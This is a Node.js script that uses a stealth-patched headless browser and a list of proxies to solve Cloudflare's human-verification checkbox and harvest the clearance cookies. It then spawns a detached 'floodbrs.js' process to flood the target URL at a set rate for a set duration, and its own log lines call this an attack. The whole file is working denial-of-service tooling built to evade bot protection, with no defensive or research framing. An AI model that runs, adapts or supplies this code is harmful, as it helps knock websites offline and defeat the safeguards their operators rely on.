const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const UserAgent = require('user-agents');
const { spawn } = require('child_process');

puppeteer.use(StealthPlugin());

const COLORS = {
    RED: '\x1b[31m',
    WHITE: '\x1b[37m',
    YELLOW: '\x1b[33m',
    GREEN: '\x1b[32m',
    CYAN: '\x1b[36m',
    RESET: '\x1b[0m'
};

// Utility functions
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const coloredLog = (color, text) => console.log(`${color}${text}${COLORS.RESET}`);
const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    return parts.length >= 2 ? `${parts[0]}.${parts[1]}.**.**:****` : proxy;
};

// Command-line arguments
const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

// Read proxies
const readProxies = (filePath) => {
    try {
        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        coloredLog(COLORS.RED, 'Error reading proxies file');
        return [];
    }
};

// Generate realistic user agent
const generateUserAgent = () => {
    const userAgent = new UserAgent({ deviceCategory: 'desktop' });
    return userAgent.toString();
};

// NEW: Enhanced Cloudflare detection untuk flow spesifik
const detectCloudflareFlow = async (page) => {
    try {
        const title = await page.title();
        const url = page.url();
        const content = await page.content();
        
        // Stage 1: Initial loading "Just a moment..."
        if ((title.includes('Just a moment') || title.includes('Checking your browser')) && 
            (content.includes('Verifying...') || content.includes('cf-spinner'))) {
            return { 
                stage: 'initial_loading', 
                message: 'Initial loading spinner - waiting 15-20s' 
            };
        }
        
        // Stage 2: Post-refresh loading (setelah auto-refresh)
        if ((title.includes('Just a moment') || title.includes('Checking your browser')) && 
            !content.includes('Verify you are human') && 
            !content.includes('Bukti bahwa Anda adalah manusia')) {
            return { 
                stage: 'refresh_loading', 
                message: 'Post-refresh loading - waiting for checkbox' 
            };
        }
        
        // Stage 3: Checkbox ready
        if (content.includes('Verify you are human') || 
            content.includes('Bukti bahwa Anda adalah manusia') ||
            content.includes('cf-challenge-waiting') ||
            content.match(/input.*type.*checkbox.*challenge/)) {
            return { 
                stage: 'checkbox_ready', 
                message: 'Checkbox is ready to be clicked' 
            };
        }
        
        // Stage 4: Challenge solved
        if (!title.includes('Just a moment') && 
            !title.includes('Checking your browser') &&
            !url.includes('challenge') &&
            !url.includes('cdn-cgi')) {
            return { 
                stage: 'solved', 
                message: 'Cloudflare challenge solved' 
            };
        }
        
        return { stage: 'unknown', message: 'Unknown Cloudflare state' };
        
    } catch (error) {
        return { stage: 'error', message: error.message };
    }
};

// NEW: Specialized solver untuk flow Loading → Refresh → Loading → Checkbox
const solveCloudflareChallenge = async (page, proxy) => {
    try {
        coloredLog(COLORS.WHITE, `[SOLVER] Starting flow-based solver: ${maskProxy(proxy)}`);
        
        let totalWaitTime = 0;
        let refreshCount = 0;
        const maxRefreshCount = 3;
        
        while (refreshCount < maxRefreshCount) {
            const flowState = await detectCloudflareFlow(page);
            coloredLog(COLORS.CYAN, `[FLOW ${refreshCount + 1}] ${flowState.stage}: ${flowState.message}`);
            
            switch (flowState.stage) {
                case 'solved':
                    coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: Challenge already solved`);
                    return { success: true, method: 'already_solved' };
                    
                case 'initial_loading':
                    coloredLog(COLORS.WHITE, `[FLOW] Stage 1: Waiting for initial loading (15-25s)...`);
                    const initialResult = await handleInitialLoading(page);
                    totalWaitTime += initialResult.waitTime || 0;
                    break;
                    
                case 'refresh_loading':
                    coloredLog(COLORS.YELLOW, `[FLOW] Stage 2: Detected refresh, waiting for checkbox...`);
                    const refreshResult = await handleRefreshLoading(page);
                    totalWaitTime += refreshResult.waitTime || 0;
                    refreshCount++;
                    break;
                    
                case 'checkbox_ready':
                    coloredLog(COLORS.GREEN, `[FLOW] Stage 3: Checkbox ready! Clicking...`);
                    const clickResult = await handleCheckboxClick(page);
                    if (clickResult.success) {
                        coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: Checkbox clicked successfully`);
                        return { 
                            success: true, 
                            method: 'checkbox_click', 
                            totalWaitTime,
                            refreshCount 
                        };
                    }
                    break;
                    
                default:
                    coloredLog(COLORS.RED, `[FLOW] Unknown state, waiting 5s...`);
                    await sleep(5000);
                    totalWaitTime += 5000;
            }
            
            // Safety timeout
            if (totalWaitTime > 120000) { // 2 menit
                coloredLog(COLORS.RED, `[SOLVER] TIMEOUT: Exceeded 2 minutes total wait time`);
                break;
            }
            
            await sleep(2000);
            totalWaitTime += 2000;
        }
        
        coloredLog(COLORS.RED, `[SOLVER] FAILED: Too many refreshes or timeout`);
        return { success: false, method: 'flow_failed', totalWaitTime, refreshCount };
        
    } catch (error) {
        coloredLog(COLORS.RED, `[SOLVER] ERROR: ${error.message}`);
        return { success: false, method: 'error', error: error.message };
    }
};

// NEW: Handle initial loading stage (15-25 detik)
const handleInitialLoading = async (page) => {
    const startTime = Date.now();
    coloredLog(COLORS.WHITE, `[LOADING] Waiting for initial loading completion...`);
    
    let lastState = 'initial_loading';
    
    while (Date.now() - startTime < 30000) { // Max 30 detik
        const currentState = await detectCloudflareFlow(page);
        
        if (currentState.stage !== lastState) {
            coloredLog(COLORS.CYAN, `[LOADING] State changed: ${lastState} → ${currentState.stage}`);
            lastState = currentState.stage;
        }
        
        // Jika pindah ke stage lain, keluar
        if (currentState.stage !== 'initial_loading') {
            const waitTime = Date.now() - startTime;
            coloredLog(COLORS.GREEN, `[LOADING] Completed in ${waitTime}ms → ${currentState.stage}`);
            return { success: true, waitTime, nextStage: currentState.stage };
        }
        
        // Simulasi aktivitas manusia selama waiting
        if (Math.random() > 0.8) {
            await page.mouse.move(100 + Math.random() * 500, 100 + Math.random() * 300);
        }
        
        await sleep(3000);
    }
    
    coloredLog(COLORS.RED, `[LOADING] Timeout waiting for initial loading`);
    return { success: false, waitTime: 30000 };
};

// NEW: Handle refresh loading stage (tunggu sampai checkbox muncul)
const handleRefreshLoading = async (page) => {
    const startTime = Date.now();
    coloredLog(COLORS.YELLOW, `[REFRESH] Monitoring for checkbox appearance...`);
    
    while (Date.now() - startTime < 45000) { // Max 45 detik
        const currentState = await detectCloudflareFlow(page);
        
        if (currentState.stage === 'checkbox_ready') {
            const waitTime = Date.now() - startTime;
            coloredLog(COLORS.GREEN, `[REFRESH] Checkbox appeared after ${waitTime}ms`);
            return { success: true, waitTime };
        }
        
        if (currentState.stage === 'solved') {
            coloredLog(COLORS.GREEN, `[REFRESH] Challenge solved during refresh wait`);
            return { success: true, waitTime: Date.now() - startTime, solved: true };
        }
        
        // Check every 2-4 seconds
        await sleep(2000 + Math.random() * 2000);
    }
    
    coloredLog(COLORS.RED, `[REFRESH] Timeout waiting for checkbox`);
    return { success: false, waitTime: 45000 };
};

// NEW: Optimized checkbox click berdasarkan POV Anda
const handleCheckboxClick = async (page) => {
    try {
        coloredLog(COLORS.WHITE, `[CHECKBOX] Finding and clicking verification checkbox...`);
        
        // Tunggu sebentar untuk memastikan checkbox fully rendered
        await sleep(2000);
        
        // Strategy 1: Cari berdasarkan atribut spesifik Cloudflare
        const cfSelectors = [
            'input[type="checkbox"][name="cf_captcha_kind"]',
            '.hcaptcha-box',
            '.cf-challenge',
            '[data-sitekey]',
            '.challenge-form input[type="checkbox"]',
            '#challenge-form input[type="checkbox"]',
            'iframe[src*="challenge"]',
            'iframe[src*="hcaptcha"]'
        ];
        
        for (const selector of cfSelectors) {
            try {
                const element = await page.$(selector);
                if (element) {
                    const isVisible = await element.evaluate(el => {
                        const rect = el.getBoundingClientRect();
                        return rect.width > 0 && rect.height > 0 && 
                               el.offsetParent !== null &&
                               el.disabled === false;
                    });
                    
                    if (isVisible) {
                        coloredLog(COLORS.CYAN, `[CHECKBOX] Found Cloudflare element: ${selector}`);
                        
                        // Scroll ke element
                        await element.evaluate(el => {
                            el.scrollIntoView({ 
                                behavior: 'smooth', 
                                block: 'center',
                                inline: 'center'
                            });
                        });
                        
                        await sleep(1500);
                        
                        // Human-like delay sebelum click
                        await sleep(1000 + Math.random() * 1000);
                        
                        // Click dengan options untuk bypass detection
                        await element.click({ delay: 100 + Math.random() * 200 });
                        coloredLog(COLORS.GREEN, `[CHECKBOX] Clicked: ${selector}`);
                        
                        // Tunggu proses verifikasi
                        await sleep(10000);
                        
                        // Verifikasi hasil
                        const finalState = await detectCloudflareFlow(page);
                        if (finalState.stage === 'solved') {
                            coloredLog(COLORS.GREEN, `[CHECKBOX] VERIFIED: Challenge solved after click`);
                            return { success: true, method: selector };
                        } else {
                            coloredLog(COLORS.YELLOW, `[CHECKBOX] Click executed but still in: ${finalState.stage}`);
                            // Mungkin butuh waktu lebih lama
                            await sleep(8000);
                            const finalCheck = await detectCloudflareFlow(page);
                            if (finalCheck.stage === 'solved') {
                                return { success: true, method: `${selector}_delayed` };
                            }
                        }
                    }
                }
            } catch (e) {
                // Continue ke selector berikutnya
            }
        }
        
        // Strategy 2: Cari berdasarkan text yang Anda sebutkan
        coloredLog(COLORS.WHITE, `[CHECKBOX] Trying text-based search...`);
        const verifyTexts = [
            'Verify you are human',
            'Bukti bahwa Anda adalah manusia',
            'I am human',
            'Saya manusia',
            'Verify',
            'Verifikasi'
        ];
        
        for (const text of verifyTexts) {
            try {
                const [element] = await page.$x(`//*[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), '${text.toLowerCase()}')]`);
                
                if (element) {
                    coloredLog(COLORS.CYAN, `[CHECKBOX] Found text: "${text}"`);
                    
                    // Cari element yang bisa di-click di sekitar text
                    const clickableElement = await element.evaluateHandle((el) => {
                        // Cari parent yang mungkin button/checkbox
                        let parent = el;
                        for (let i = 0; i < 6; i++) {
                            parent = parent.parentElement;
                            if (!parent) break;
                            
                            if (parent.tagName === 'BUTTON' || 
                                parent.getAttribute('role') === 'button' ||
                                parent.querySelector('input[type="checkbox"]') ||
                                parent.onclick ||
                                parent.getAttribute('onclick')) {
                                return parent;
                            }
                        }
                        return el;
                    });
                    
                    if (clickableElement) {
                        await clickableElement.evaluate(el => {
                            el.scrollIntoView({ behavior: 'smooth', block: 'center' });
                        });
                        
                        await sleep(1000);
                        await clickableElement.click();
                        coloredLog(COLORS.GREEN, `[CHECKBOX] Clicked text element: ${text}`);
                        
                        await sleep(10000);
                        
                        const finalState = await detectCloudflareFlow(page);
                        if (finalState.stage === 'solved') {
                            return { success: true, method: `text_${text}` };
                        }
                    }
                }
            } catch (e) {
                // Continue
            }
        }
        
        coloredLog(COLORS.RED, `[CHECKBOX] All strategies failed`);
        return { success: false };
        
    } catch (error) {
        coloredLog(COLORS.RED, `[CHECKBOX] ERROR: ${error.message}`);
        return { success: false, error: error.message };
    }
};

// Browser configuration
const createBrowser = async () => {
    const userAgent = generateUserAgent();
    
    const args = [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--disable-gpu',
        '--no-first-run',
        '--no-default-browser-check',
        '--disable-background-timer-throttling',
        '--disable-backgrounding-occluded-windows',
        '--ignore-certificate-errors',
        '--ignore-ssl-errors',
        '--disable-web-security',
        '--window-size=1920,1080',
        `--user-agent=${userAgent}`
    ];

    return await puppeteer.launch({
        headless: true,
        args: args,
        ignoreHTTPSErrors: true
    });
};

// Stealth setup
const setupStealth = async (page) => {
    await page.setViewport({
        width: 1920 + Math.floor(Math.random() * 100),
        height: 1080 + Math.floor(Math.random() * 100),
        deviceScaleFactor: 1,
        isMobile: false,
        hasTouch: false,
        isLandscape: true
    });

    await page.setExtraHTTPHeaders({
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'no-cache'
    });

    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(navigator, 'plugins', {
            get: () => [1, 2, 3, 4, 5]
        });
        Object.defineProperty(navigator, 'webdriver', {
            get: () => false
        });
        Object.defineProperty(navigator, 'language', {
            get: () => 'en-US'
        });
        Object.defineProperty(navigator, 'languages', {
            get: () => ['en-US', 'en']
        });
    });
};

// Extract cookies
const extractCookies = async (page) => {
    try {
        await sleep(3000);
        const cookies = await page.cookies();
        const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        
        const cfCookies = cookies.filter(cookie => 
            cookie.name.includes('cf_') || cookie.name.includes('_cf')
        );
        
        coloredLog(COLORS.GREEN, `[COOKIES] Extracted ${cookies.length} cookies, ${cfCookies.length} Cloudflare`);
        return { success: true, cookies: cookieString };
        
    } catch (error) {
        coloredLog(COLORS.RED, `[COOKIES] ERROR: ${error.message}`);
        return { success: false, cookies: '' };
    }
};

// Main browser function
const launchBrowser = async (targetURL, proxy, index, total) => {
    let browser;
    try {
        coloredLog(COLORS.YELLOW, `[BROWSER ${index}/${total}] Launching: ${maskProxy(proxy)}`);
        
        browser = await createBrowser();
        const page = await browser.newPage();
        
        await setupStealth(page);
        
        coloredLog(COLORS.WHITE, `[BROWSER ${index}/${total}] Navigating...`);
        await page.goto(targetURL, { 
            waitUntil: 'networkidle0',
            timeout: 60000 
        });
        
        // Solve challenge dengan flow baru
        const challengeResult = await solveCloudflareChallenge(page, proxy);
        
        if (!challengeResult.success) {
            throw new Error(`Challenge failed: ${challengeResult.method}`);
        }
        
        coloredLog(COLORS.GREEN, `[SUCCESS ${index}/${total}] Solved! Method: ${challengeResult.method}, Wait: ${challengeResult.totalWaitTime}ms, Refreshes: ${challengeResult.refreshCount}`);
        
        // Extract cookies
        const cookieResult = await extractCookies(page);
        
        if (cookieResult.success && cookieResult.cookies) {
            // Launch flood process
            const floodProcess = spawn('node', [
                'floodbrs.js',
                targetURL,
                duration.toString(),
                rate,
                '1',
                proxyFile,
                cookieResult.cookies,
                generateUserAgent(),
                'cf-session-key'
            ], {
                detached: true,
                stdio: 'ignore'
            });
            
            floodProcess.unref();
            coloredLog(COLORS.GREEN, `[ATTACK ${index}/${total}] Flood process started`);
        }
        
        await browser.close();
        return { success: true, ...challengeResult };
        
    } catch (error) {
        if (browser) await browser.close();
        coloredLog(COLORS.RED, `[BROWSER ${index}/${total}] ERROR: ${error.message}`);
        return { success: false, error: error.message };
    }
};

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    if (proxies.length === 0) {
        coloredLog(COLORS.RED, '[ERROR] No proxies found');
        return;
    }

    coloredLog(COLORS.GREEN, `[START] Flow-based Cloudflare solver with ${proxies.length} proxies`);
    
    const results = {
        success: 0,
        failed: 0,
        methods: {},
        avgWaitTime: 0,
        totalWaitTime: 0
    };
    
    const concurrency = 2;
    const delayBetweenBatches = 15000;
    
    for (let i = 0; i < proxies.length; i += concurrency) {
        const batch = proxies.slice(i, i + concurrency);
        coloredLog(COLORS.CYAN, `[BATCH] Processing ${i + 1}-${i + batch.length} of ${proxies.length}`);
        
        const batchPromises = batch.map((proxy, batchIndex) => 
            launchBrowser(targetURL, proxy, i + batchIndex + 1, proxies.length)
        );
        
        const batchResults = await Promise.all(batchPromises);
        
        batchResults.forEach(result => {
            if (result.success) {
                results.success++;
                results.methods[result.method] = (results.methods[result.method] || 0) + 1;
                results.totalWaitTime += result.totalWaitTime || 0;
            } else {
                results.failed++;
            }
        });
        
        coloredLog(COLORS.WHITE, `[STATUS] Success: ${results.success}, Failed: ${results.failed}`);
        
        if (i + concurrency < proxies.length) {
            coloredLog(COLORS.CYAN, `[BATCH] Waiting ${delayBetweenBatches/1000}s...`);
            await sleep(delayBetweenBatches);
        }
    }
    
    // Final report
    results.avgWaitTime = results.success > 0 ? Math.round(results.totalWaitTime / results.success) : 0;
    
    coloredLog(COLORS.GREEN, `[FINAL] Completed: ${results.success}/${proxies.length} successful (${((results.success/proxies.length)*100).toFixed(1)}%)`);
    coloredLog(COLORS.CYAN, `[TIMING] Average solve time: ${results.avgWaitTime}ms`);
    coloredLog(COLORS.CYAN, `[METHODS] ${JSON.stringify(results.methods, null, 2)}`);
    
    coloredLog(COLORS.YELLOW, `[ATTACK] Running for ${duration} seconds...`);
    await sleep(duration * 1000);
    coloredLog(COLORS.YELLOW, '[SHUTDOWN] Attack completed');
};

process.on('SIGINT', () => {
    coloredLog(COLORS.YELLOW, '[INFO] Stopping gracefully...');
    process.exit(0);
});

coloredLog(COLORS.GREEN, '[READY] 🚀 CLOUDFLARE FLOW SOLVER STARTED 🚀');
main().catch(err => {
    coloredLog(COLORS.RED, `[MAIN ERROR] ${err.message}`);
});
